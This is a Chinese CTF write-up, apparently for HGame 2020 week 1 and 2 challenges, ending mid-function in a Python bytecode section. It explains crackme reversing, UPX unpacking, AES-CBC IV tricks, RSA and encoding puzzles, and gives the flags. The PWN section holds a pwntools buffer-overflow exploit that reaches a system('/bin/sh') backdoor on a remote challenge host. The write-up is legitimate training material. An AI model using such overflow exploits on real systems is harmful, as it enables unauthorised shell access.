sub_4007E6();//只负责输出，没什么功能 v6 = 76;v7 = 60;v8 = 214;v9 = 54;v10 = 80;v11 = 136;v12 = 32;v13 = 204; __isoc99_scanf(\"%39s\", &amp;s); if ( strlen(&amp;s) == 39 &amp;&amp; s == 'h' &amp;&amp; v19 == 'g' &amp;&amp; v20 == 'a' &amp;&amp; v21 == 'm' &amp;&amp; v22 == 'e' &amp;&amp; v23 == '{' &amp;&amp; v26 == '}' )// 共39位，hgame{***}格式 { v14 = 0LL; v15 = 0; v16 = 0LL; v17 = 0; //这两条命令进行第一部分运算 sub_400616((__int64)&amp;v14, (__int64)&amp;v24); // 传入地址，对flag中的部分进行操作 sub_400616((__int64)&amp;v16, (__int64)&amp;v25); //这里开始进行第二部分运算 for ( i = 0; i &lt;= 7; ++i ) { *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; 0xE0) &gt;&gt; 5) | 8 * *((_BYTE *)&amp;v14 + i);// &amp;v14 + i前三位与后五位交换位置 *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或 *((_BYTE *)&amp;v16 + 7 - i) = 2 * (*((_BYTE *)&amp;v14 + i) &amp; 0x55) ^ *((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA | *((_BYTE *)&amp;v16 + 7 - i) &amp; 0x55;// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或 *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或 } //这里进行第三部分运算 for ( j = 0; j &lt;= 7; ++j ) { *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j); // v6 = 76; // v7 = 60; // v8 = 214; // v9 = 54; // v10 = 80; // v11 = 136; // v12 = 32; // v13 = 204; if ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )// e4sy_Re_ { puts(\"sry, wrong flag\"); exit(0); } } for ( k = 0; k &lt;= 7; ++k ) { *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k); // v6 = 76; //这里异或之后又变成了V14最初始的值 // v7 = 60; // v8 = 214; // v9 = 54; // v10 = 80; // v11 = 136; // v12 = 32; // v13 = 204; if ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )// Easylif3 { puts(\"Just one last step\"); exit(0); } } puts(\"Congratulations! You are already familiar with bitwise operation.\"); puts(\"Flag is your input.\"); exit(0); } puts(\"Illegal input!\"); exit(0);}//sub_400616() 第一部分运算所用到的函数_BYTE *__fastcall sub_400616(__int64 a1, __int64 a2){ _BYTE *result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i &lt;= 7; ++i ) { if ( *(_BYTE *)(2 * i + a2) &lt;= 96 || *(_BYTE *)(2 * i + a2) &gt; 102 ) { if ( *(_BYTE *)(2 * i + a2) &lt;= 47 || *(_BYTE *)(2 * i + a2) &gt; 57 ) {LABEL_17: puts(\"Illegal input!\"); exit(0); } *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 48; } else { *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 87; } if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 96 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 102 ) { if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 47 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 57 ) goto LABEL_17; result = (_BYTE *)(i + a1); *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 48; } else { result = (_BYTE *)(i + a1); *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 87; } } return result;}//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理 把整个过程理解清楚之后可以开始写脚本进行一个逆运算了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#-*- coding:utf-8 -*-# 第三部分逆运算v = [76, 60, 214, 54, 80, 136, 32, 204]v0 = 'e4sy_Re_'v14 = []for i in range(len(v0)): v14.append(ord(v0[i]) ^ v[i])# print(v14)v16 = []v1 = 'Easylif3'for i in range(len(v1)): v16.append(ord(v1[i]) ^ v14[i]) # v14经过两次和v的异或又变回了原本的值# print(v16)# 第二部分逆运算for i in range(8): # print(bin(v14[i])[2:].rjust(8,'0')) v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256 # print(bin(v14[i])[2:].rjust(8,'0')) # print(bin(v16[7-i])[2:].rjust(8, '0')) v16[7 - i] = (2 * (v14[i] &amp; 0x55) ^ v16[7 - i] &amp; 0xAA | v16[7 - i] &amp; 0x55) % 256 # print(bin(v16[7-i])[2:].rjust(8, '0')) # print(bin(v14[i])[2:].rjust(8, '0')) v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256 # print(bin(v14[i])[2:].rjust(8, '0')) # print(bin(v14[i])[2:].rjust(8,'0')) v14[i] = (((v14[i] &amp; 0x1F) &lt;&lt; 5) | ((v14[i] &amp; 0xF8) &gt;&gt; 3)) % 256 # print(bin(v14[i])[2:].rjust(8,'0'))# print(v14)# print(v16)# 第一部分逆运算v24 = [0 for i in range(16)]v25 = [0 for i in range(16)]alphabet = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]# 字母表不多，逆运算难以进行所以采用遍历的方式进行计算for i in range(8): for j in alphabet: if 57 &gt;= j &gt; 47: tmp = j - 48 else: tmp = j - 87 v24[2*i]=j if 57 &gt;= v14[i] - 16 * tmp + 48 &gt; 47: v24[2 * i + 1] = v14[i] - 16 * tmp + 48 break elif 102 &gt;= v14[i] - 16 * tmp + 87 &gt; 96: v24[2 * i + 1] = v14[i] - 16 * tmp + 87 break else: continuefor i in range(8): for j in alphabet: v25[2 * i] = j if 57 &gt;= j &gt; 47: tmp = j - 48 else: tmp = j - 87 if 102 &gt;= v16[i] - 16 * tmp + 87 &gt; 96: v25[2 * i + 1] = v16[i] - 16 * tmp + 87 break elif 57 &gt;= v16[i] - 16 * tmp + 48 &gt; 47: v25[2 * i + 1] = v16[i] - 16 * tmp + 48 break else: continue# print(v24)# print(v25)flag = 'hgame{'+''.join([chr(v24[i]) for i in range(16)]) + ''.join([chr(v25[i]) for i in range(16)])+'}'print(flag) 输出得到flag 1hgame{0f233e63637982d266cbf41ecb1b0102} 到虚拟机上验证一下，发现结果正确 advancewindows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990int __cdecl main(int argc, const char **argv, const char **envp){ __int64 len; // rax int len0; // edi unsigned __int64 v5; // rax _BYTE *v6; // rbx const char *v7; // rcx char flag; // [rsp+20h] [rbp-118h] puts(\"please input you flag:\\n\"); memset(&amp;flag, 0, 0x100ui64); scanf(\"%s\", &amp;flag, 100i64); len = strlen(&amp;flag); // 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100） len0 = len; if ( !len ) // 若输入空字符串，直接报错 {LABEL_6: v7 = \"try again\\n\"; goto LABEL_7; } v5 = sub_140002000(len); v6 = malloc(v5); // 分配空间 cryption(v6, (__int64)&amp;flag, len0); // 加密算法部分 if ( strncmp(v6, \"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX\", 0x64ui64) )// 相同则返回0，跳过if，输出get it，flag正确 { if ( v6 ) free(v6); goto LABEL_6; } v7 = \"get it\\n\";LABEL_7: puts(v7); return 0;}//最重要的cryption加密函数signed __int64 __fastcall sub_140001EB0(_BYTE *a1, __int64 a2, int a3){ int v3; // er10 __int64 v4; // rax __int64 v5; // rbx _BYTE *v6; // rdi _BYTE *v7; // r9 signed __int64 v8; // r11 unsigned __int64 v9; // rdx unsigned __int64 v10; // rax char v11; // cl // a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度 v3 = 0; v4 = a3 - 2; v5 = a2; v6 = a1; v7 = a1; if ( v4 &gt; 0 ) { v8 = a2 + 1; v9 = ((unsigned __int64)((unsigned __int64)(v4 - 1) * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 &gt;&gt; 64) &gt;&gt; 1) + 1; v3 = 3 * v9; do { v10 = *(unsigned __int8 *)(v8 - 1); v8 += 3i64; *v7 = alphabet[v10 &gt;&gt; 2]; v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v8 - 3) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v8 - 4) &amp; 3)]; v7[2] = alphabet[4i64 * (*(_BYTE *)(v8 - 3) &amp; 0xF) | ((unsigned __int64)*(unsigned __int8 *)(v8 - 2) &gt;&gt; 6)]; v7[3] = alphabet[*(_BYTE *)(v8 - 2) &amp; 0x3F]; v7 += 4; --v9; } while ( v9 ); } if ( v3 &lt; a3 ) { *v7 = alphabet[(unsigned __int64)*(unsigned __int8 *)(v3 + v5) &gt;&gt; 2]; if ( v3 == a3 - 1 ) { v11 = 61; v7[1] = alphabet[16 * (*(_BYTE *)(v3 + v5) &amp; 3)]; } else { v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v5 + v3 + 1) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v3 + v5) &amp; 3)]; v11 = alphabet[4 * (*(_BYTE *)(v5 + v3 + 1) &amp; 0xF)]; } v7[2] = v11; v7[3] = 61; v7 += 4; } *v7 = 0; return v7 - v6 + 1;} 可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组 1alphabet='abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ' 观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#-*- coding:utf-8 -*-def b64de(path_in, path_out): b64_str = open(path_in).read() charset = \"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ\" # print(charset) bin_str = [] for i in b64_str: if i != '=': try: x = str(bin(charset.index(i))).replace('0b', '') except ValueError: print(i) bin_str.append('{:0&gt;6}'.format(x)) # 填充成6位 # print(bin_str) b64_bin = bytearray() # 最后只能写入bytes nums = len(bin_str) // 4 remain = len(bin_str) % 4 fore_part = bin_str[:4 * nums] # 四个一组截取 # print(fore_part) while fore_part: # 取4个6位base64字符，作为3个字节 b64_tmp = ''.join(fore_part[:4]) # 4*6/8 b64_tmp = [int(b64_tmp[x: x + 8], 2) for x in [0, 8, 16]] # 转换成10进制 # print(b64_tmp) for i in b64_tmp: b64_bin.append(i) fore_part = fore_part[4:] # 向后移动四位 if remain: remain_part = ''.join(bin_str[nums * 4:]) # print(remain_part) tmp = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] # print(tmp) for i in tmp: b64_bin.append(i) # print(b64_bin) fd = open(path_out, 'wb') fd.write(b64_bin) fd.close() if __name__ == '__main__': b64de(\"./pic_en.txt\", \"./pic_de.txt\") 输出的flag为： 1hgame{b45e6a_i5_50_eazy_6VVSQ} cpp这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970sub_140002AE0((__int64)&amp;v13); // 大概是string类的构造函数 sub_1400018D0(std::cin, &amp;v13); // cin&gt;&gt;v13 v15 = \"hgame{\"; sub_140002B30((__int64)&amp;v14); if ( find_sub(&amp;v13, v15, 0i64) || find_sub(&amp;v13, \"}\", 0i64) != 61 )// 猜测输入字符串长度位62，格式位hgame{***} { v5 = sub_140001900(std::cout, \"error\"); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140002830); sub_140003010(&amp;v14); sub_140002FA0(&amp;v13); result = 0i64; } else { for ( i = 6i64; ; i = v11 + 1 ) // 一波操作完全看不懂，猜测是根据'_'来分割字符串，分割成9个数 { LOBYTE(v0) = '_'; v11 = find(&amp;v13, v0, i); if ( v11 == -1 ) break; v16 = sub_1400043B0(&amp;v13, &amp;v40, i, v11 - i); v17 = v16; v1 = sub_140003E80(v16); v18 = atoll(v1); sub_140004350(&amp;v14, &amp;v18); sub_140002FA0(&amp;v40); } v19 = sub_1400043B0(&amp;v13, &amp;v41, i, 61 - i); v20 = v19; v2 = sub_140003E80(v19); v21 = atoll(v2); // 直接把字符串转换成长整型，说明字符串里就是以'_'连接的数字 sub_140004350(&amp;v14, &amp;v21); sub_140002FA0(&amp;v41); v31 = 26727i64; // 根据下面的运算这里应该是两个矩阵 v32 = 24941i64; v33 = 101i64; v34 = 29285i64; v35 = 26995i64; v36 = 29551i64; v37 = 29551i64; v38 = 25953i64; v39 = 29561i64; v22 = 1i64; v23 = 0i64; v24 = 1i64; v25 = 0i64; v26 = 1i64; v27 = 1i64; v28 = 1i64; v29 = 2i64; v30 = 2i64; for ( j = 0i64; j &lt; 3; ++j ) // 三个for循环时矩阵运算，如果满足条件就直接输出正确 { for ( k = 0i64; k &lt; 3; ++k ) { v12 = 0i64; for ( l = 0; l &lt; 3; ++l ) v12 += *(&amp;v22 + 3 * l + k) * *(_QWORD *)sub_1400031E0(&amp;v14, l + 3 * j); if ( *(&amp;v31 + 3 * j + k) != v12 ) { v3 = sub_140001900(std::cout, \"error\"); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, sub_140002830); sub_140003010(&amp;v14); sub_140002FA0(&amp;v13); return 0i64; } } } v6 = sub_140001900(std::cout, \"you are good at re\"); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v6, sub_140002830); 最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag 尝试一下 1234567891011121314import numpy as npa = np.array([[1, 0, 1], [0, 1, 1], [1, 2, 2]])b = np.linalg.inv(a)# print(b)# print(np.dot(a,b))c = np.array([[26727, 24941, 101], [29285, 26995, 29551], [29551, 25953, 29561]])flag = ''d = np.dot(c, b)for i in range(3): for j in range(3): flag += str(int(d.item(i, j))) + '_'flag = 'hgame{' + flag[:-1] + '}'print(flag) 提交提示成功，猜测正确 1hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943} PWNHard_AAAAAIDA反编译 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+0h] [ebp-ACh] char v5; // [esp+7Bh] [ebp-31h] unsigned int v6; // [esp+A0h] [ebp-Ch] int *v7; // [esp+A4h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); alarm(8u); setbuf(_bss_start, 0); memset(&amp;s, 0, 0xA0u); puts(\"Let's 0O0o\\\\0O0!\"); gets(&amp;s); if ( !memcmp(\"0O0o\", &amp;v5, 7u) ) backdoor(); return 0;}//backdoorint backdoor(){ return system(\"/bin/sh\");} 所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload 1234567from pwn import *io = remote(\"47.103.214.163\",\"20000\")#io=process(\"./Hard_AAAAA\")io.recvuntil(\"Let's 0O0o\\\\0O0!\")payload='a'*123+'0O0o\\0O0'io.sendline(payload)io.interactive() 最终得到flag： 1hgame{0OoO0oo0O0Oo} CryptoInfantRSA简单的RSA解密，p和q都已经分解出来了，其它的没什么难度 12345678910111213141516171819202122232425262728#-*- coding:utf-8 -*-def gcdext(a, b): \"\"\" a: 模的取值 b: 想求逆的值 \"\"\" if b == 0: return 1, 0, a x, y, gcd = gcdext(b, a % b) return y, x - a // b * y, gcdc = 275698465082361070145173688411496311542172902608559859019841p = 681782737450022065655472455411q = 675274897132088253519831953441e = 13n = p * q# print(k)fai = (p - 1) * (q - 1)(d, k, g) = gcdext(e, fai)# print(fai)# print(k)# print(m)m = pow(c, d, n)# print(m)f = m.to_bytes(22, byteorder='big')print(f) 直接求解出来flag 1hgame{t3Xt6O0k_R5A!!!} misc欢迎参加HGame！首先看到一长串似曾相识的东西 1Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t 像是摩斯电码base64加密之后的东西 所以base64解码之后 1.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...-- 果然是摩斯电码，然后解摩斯电码 12345678910111213141516171819202122232425262728293031323334353637383940#-*- coding:utf-8 -*-CODE = {'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.', '.': '.-.-.-', ':': '---...', ',': '--..--', ';': '-.-.-.', '?': '..--..', '=': '-...-', '\\'': '.----.', '/': '-..-.', '!': '-.-.--', '-': '-....-', '_': '..--.-', '\"': '.-..-.', '(': '-.--.', ')': '-.--.-', '$': '...-..-', '&amp;': '.-...', '@': '.--.-.' }def Decode(str): Decode_value = CODE.keys() Decode_key = CODE.values() Decode_dict = dict(zip(Decode_key, Decode_value)) text = '' msg = str.split(' ') for s in msg: if s in Decode_dict.keys(): text += Decode_dict[s] return textprint(Decode('.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--')) 这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame： 1hgame{W3LC0ME_TO_2020_HGAM3} 壁纸下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815 解压出来打开flag.txt，内容如下： 1\\u68\\u67\\u61\\u6d\\u65\\u7b\\u44\\u6f\\u5f\\u79\\u30\\u75\\u5f\\u4b\\u6e\\u4f\\u57\\u5f\\u75\\u4e\\u69\\u43\\u30\\u64\\u33\\u3f\\u7d unicode编码，解码得： 1hgame{Do_y0u_KnOW_uNiC0d3?} 签到题ProPlus压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下： 123456Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fences first, Five Caesar next. English sentense first, zip password next. 根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码 123Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.EAVMUBAQHQMVEPDT 解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag 1hgame{3Nc0dInG_@lL_iN_0Ne!} 这题有各种各样的编码，还不错 Week2REunpack明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）脱壳的过程借鉴https://www.52pojie.cn/thread-1048649-1-1.html很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;idc.idc&gt;#define PT_LOAD 1#define PT_DYNAMIC 2static main(void){ auto ImageBase,StartImg,EndImg; auto e_phoff; auto e_phnum,p_offset; auto i,dumpfile; ImageBase=0x400000; StartImg=0x400000; EndImg=0x0; if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f ) { if(dumpfile=fopen(\"D:\\\\dumpfile\",\"wb\")) { e_phoff=ImageBase+Qword(ImageBase+0x20); Message(\"e_phoff = 0x%x\\n\", e_phoff); e_phnum=Word(ImageBase+0x38); Message(\"e_phnum = 0x%x\\n\", e_phnum); for(i=0;i&lt;e_phnum;i++) { if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC) { p_offset=Qword(e_phoff+0x8); StartImg=Qword(e_phoff+0x10); EndImg=StartImg+Qword(e_phoff+0x28); Message(\"start = 0x%x, end = 0x%x, offset = 0x%x\\n\", StartImg, EndImg, p_offset); dump(dumpfile,StartImg,EndImg,p_offset); Message(\"dump segment %d ok.\\n\",i); } e_phoff=e_phoff+0x38; } fseek(dumpfile,0x3c,0); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fseek(dumpfile,0x28,0); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fclose(dumpfile); }else Message(\"dump err.\"); }}static dump(dumpfile,startimg,endimg,offset) { auto i; auto size; size=endimg-startimg; fseek(dumpfile,offset,0); for ( i=0; i &lt; size; i=i+1 ) { fputc(Byte(startimg+i),dumpfile); }} 尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分 1234567891011121314151617scanf((__int64)\"%42s\", v7); v5 = 0; for ( i = 0; i &lt;= 41; ++i ) { if ( i + v7[i] != (unsigned __int8)byte_6CA0A0[i] ) v5 = 1; } if ( v5 == 1 ) { v0 = \"Wrong input\"; printf(\"Wrong input\", v7); } else { v0 = \"Congratulations! Flag is your input\"; printf(\"Congratulations! Flag is your input\", v7); } 本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { unsigned char ida_chars[] = { 0x68, 0x68, 0x63, 0x70, 0x69, 0x80, 0x5B, 0x75, 0x78, 0x49, 0x6D, 0x76, 0x75, 0x7B, 0x75, 0x6E, 0x41, 0x84, 0x71, 0x65, 0x44, 0x82, 0x4A, 0x85, 0x8C, 0x82, 0x7D, 0x7A, 0x82, 0x4D, 0x90, 0x7E, 0x92, 0x54, 0x98, 0x88, 0x96, 0x98, 0x57, 0x95, 0x8F, 0xA6 }; string flag; for(int i=0;i&lt;42;i++) { flag+=ida_chars[i]-i; } cout&lt;&lt;flag&lt;&lt;endl; return 0;} 最后输出flag 1hgame{Unp@cking_1s_R0m4ntic_f0r_r3vers1ng} Classic_CrackMePEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度， dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里 123456789101112131415161718192021222324252627282930313233343536373839404142434445private void button1_Click(object sender, EventArgs e) { if (this.status == 1) { MessageBox.Show(\"你已经激活成功啦，快去提交flag吧~~~\"); return; } string text = this.textBox1.Text; if (text.Length != 46 || text.IndexOf(\"hgame{\") != 0 || text.IndexOf(\"}\") != 45) { MessageBox.Show(\"Illegal format\"); return; } string base64iv = text.Substring(6, 24); string str = text.Substring(30, 15); try { Aes aes = new Aes(\"SGc0bTNfMm8yMF9XZWVLMg==\", base64iv); Aes aes2 = new Aes(\"SGc0bTNfMm8yMF9XZWVLMg==\", \"MFB1T2g5SWxYMDU0SWN0cw==\"); string text2 = aes.DecryptFromBase64String(\"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\"); if (text2.Equals(\"Same_ciphertext_\")) { byte[] array = new byte[16]; Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16); if (Convert.ToBase64String(array).Equals(\"dJntSWSPWbWocAq4yjBP5Q==\")) { MessageBox.Show(\"注册成功！\"); this.Text = \"已激活，欢迎使用！\"; this.status = 1; } else { MessageBox.Show(\"注册失败！\\nhint: \" + aes2.DecryptFromBase64String(\"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\")); } } else { MessageBox.Show(\"注册失败！\\nhint: \" + aes2.DecryptFromBase64String(\"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\")); } } catch { MessageBox.Show(\"注册失败！\"); } } 发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。 对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果 对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。 不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。 直接python解决： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from Crypto.Cipher import AESimport base64# 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文class AesCrypter(object): def __init__(self, key, iv): self.key = key self.iv = iv def pkcs7padding(self, text): bs = AES.block_size # 16 length = len(text) bytes_length = len(bytes(text, encoding='utf-8')) padding_size = length if (bytes_length == length) else bytes_length padding = bs - padding_size % bs padding_text = chr(padding) * padding return text + padding_text def pkcs7unpadding(self, text): length = len(text) unpadding = ord(text[length - 1]) return text[0:length - unpadding] def encrypt(self, content): cipher = AES.new(self.key, AES.MODE_CBC, self.iv) content_padding = self.pkcs7padding(content) aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding='utf-8')) result = base64.b64encode(aes_encode_bytes).decode(encoding='utf-8') return result def decrypt(self, content): cipher = AES.new(self.key, AES.MODE_CBC, self.iv) # base64解码 aes_encode_bytes = base64.b64decode(content) # 解密 aes_decode_bytes = cipher.decrypt(aes_encode_bytes) # 重新编码 result = aes_decode_bytes.decode(encoding='utf-8') # 去除填充内容 result = self.pkcs7unpadding(result) if result == None: return \"\" else: return resultkey = base64.b64decode(\"SGc0bTNfMm8yMF9XZWVLMg==\")fakeIV = base64.b64decode('MFB1T2g5SWxYMDU0SWN0cw==')plainText = \"Same_ciphertext_\"ciperText = \"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\"aesCipher = AesCrypter(key, fakeIV)fakePlainText = aesCipher.decrypt(ciperText)# print(fakePlainText)IV = ''for i in range(16): IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))# print(\"IV : \" + IV)# /TyXYzPnY;$)\\we_IV = base64.b64encode(IV.encode('utf-8')).decode('utf-8')cipherText2 = aesCipher.encrypt(plainText)cipherText2 = base64.b64decode(cipherText2).hex()[:32]cipherText3 = 'dJntSWSPWbWocAq4yjBP5Q=='cipherText3 = base64.b64decode(cipherText3).hex()[:32]# print(cipherText2 + cipherText3)cipherText4 = bytes.fromhex(cipherText2 + cipherText3)cipherText4 = base64.b64encode(cipherText4)# print(cipherText4)plainText3 = aesCipher.decrypt(cipherText4)# print(plainText3)# Same_ciphertext_DiFfer3Nt_w0r1dflag = ''flag += 'hgame{' + IV + plainText3[16:] + '}'print(flag)# hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d} 最终的flag 1hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d} babyPy这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来 dis指令表见https://docs.python.org/3/library/dis.html#python-bytecode-instructions 还原出来的函数原型（想打死命名的人） 12345678def encrypt(OOo): O0O = OOo[::-1] O0o = list(O0O) for O0 in range(1, len(O0o)): Oo = 